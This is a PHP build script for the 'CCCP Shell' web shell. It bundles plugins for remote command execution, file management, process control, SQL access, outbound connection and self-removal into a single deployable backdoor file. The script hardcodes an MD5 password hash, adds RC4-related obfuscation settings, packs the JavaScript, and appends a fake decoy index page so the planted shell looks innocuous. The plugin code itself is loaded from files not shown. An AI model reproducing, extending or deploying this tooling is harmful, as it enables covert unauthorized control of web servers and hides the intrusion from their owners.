<?php

$language = array('es', 'en');
$plugins = array('connect', 'execute', 'filemanager', 'info', 'process', 'selfremove', 'sql');

$theme = 'default';
$charset = 'utf-8';
$sPass = md5('cccpshell');







$baseFolder = dirname(__file__);
require "{$baseFolder}/base/config.php";
require "{$baseFolder}/includes/jsPacker.php";
require "{$baseFolder}/includes/tools.php";


$rc4drop = mt_rand(23, 123);
$config['rc4drop'] = $rc4drop;
$timestamp = date($config['datetime'], time());

function tText($id, $def){
	
	if (isset($lang[$id])) return $lang[$id];
	else return $def;
}


//base functions
$baseCode = file_get_contents("{$baseFolder}/base/php.php");
require "{$baseFolder}/base/js.php";
$themeJS = $code;
$themeCSS = file_get_contents("{$baseFolder}/themes/{$theme}/css.css");

//plugins
$genMenu = '';
$genPlugins = '';
foreach ($plugins as $plugin) {
	$folder = "{$baseFolder}/plugins/{$plugin}";

	if (file_exists("{$folder}/php.php")) {
		require "{$folder}/php.php";

		//menu
		$genMenu .= mLink("<b>{$tText}</b>", 'ajaxLoad("me=' . $plugin . '")') . ' | ';

		//plugins
		if (!empty($genPlugins))
			$genPlugins .= ' else ';

		$genPlugins .= "if (\$p['me'] === '{$plugin}') {
			{$code}
		}";	
	}

	if (file_exists("{$folder}/js.php")) {
		require "{$folder}/js.php";
		$themeJS .= $code;
	}

	if (file_exists("{$folder}/css.css")) {
		$themeCSS .= file_get_contents("{$folder}/css.css");
	}
}

//default action
if (in_array('filemanager', $plugins)) {
	$defAction = "filemanager' . (isset(\$p['dir']) ? '&dir=' . rawurlencode(\$p['dir']) : '') . '";
} else {
	$defAction = "{$plugins[0]}";
}

//theme
$themeJS = packer_pack_js($themeJS);
$themeJS = str_replace("'", "\'", $themeJS);

$genMenu .= mLink('<b>' . tText('logout', 'Logout') . '</b>', 'if (confirm("' . tText('merror', 'Are you sure?') . '")) {sessionStorage.clear();hash="";d.getElementsByTagName("html")[0].innerHTML="";}');	
$genMenu = str_replace("'", "\'", $genMenu);

$code = file_get_contents("{$baseFolder}/themes/{$theme}/theme.html");
$code = str_replace(array('{{_JS_}}', '{{_CSS_}}', '{{_MENU_}}'), array($themeJS, $themeCSS, $genMenu), $code);

$genPlugins .= " else if (\$p['me'] === 'loader') {
	\$defAction = 'ajaxLoad(\"me={$defAction}\")';
	\$loader = '{$code}';

	sAjax(\$loader);
}";	

$themeJS = file_get_contents("{$baseFolder}/themes/{$theme}/fake-js.js");
$themeJS = packer_pack_js($themeJS);
$code = file_get_contents("{$baseFolder}/themes/{$theme}/fake.html");
$fakeIndex = str_replace('{{_JS_}}', $themeJS, $code);


$shell = "<?php
/*
 * CCCP Shell
 * by DSR!
 * https://github.com/xchwarze/CCCPShell
 * v 1.0.0 build: {$timestamp}
 */

# System variables
\$config['charset'] = '{$charset}'; //'utf-8', 'big5', 'gbk', 'iso-8859-2', 'euc-kr', 'euc-jp'
\$config['date'] = '{$config['date']}';
\$config['datetime'] = '{$config['datetime']}';
\$config['hd_lines'] = {$config['hd_lines']};   //lines in hex preview file
\$config['hd_rows'] = {$config['hd_rows']};    //16, 24 or 32 bytes in one line
\$config['FMLimit'] = {$config['FMLimit']};   //file manager item limit. false = No limit
\$config['SQLLimit'] = {$config['SQLLimit']};   //sql manager result limit.
\$config['checkBDel'] = true;//Check Before Delete: true = On 
\$config['consNames'] = array('post'=>'dsr', 'slogin'=>'cccpshell', 'sqlclog'=>'conlog'); //Constants names
\$config['sPass'] = '{$sPass}'; // md5(pass) //cccpshell
\$config['rc4drop'] = {$rc4drop};  //drop size


// ------ Start CCCPShell
{$baseCode}

if (isset(\$p['me'])) {
	{$genPlugins}
}

#Se fini
if (isset(\$_SERVER['HTTP_X_REQUESTED_WITH']) && \$_SERVER['HTTP_X_REQUESTED_WITH'] === 'XMLHttpRequest')
	sAjax(\$sBuff . mHide('etime', substr((microtime(true) - \$loadTime), 0, 4)));
	//sAjax(\$sBuff . mHide('etime', substr((microtime(true) - \$loadTime), 0, 4) . ' Mem Peak: ' . sizecount(memory_get_peak_usage(false)) . ' Men: ' . sizecount(memory_get_usage(false))) );
?>
{$fakeIndex}";



//echo $shell;
file_put_contents("{$baseFolder}/CCCP-Shell.php", $shell);
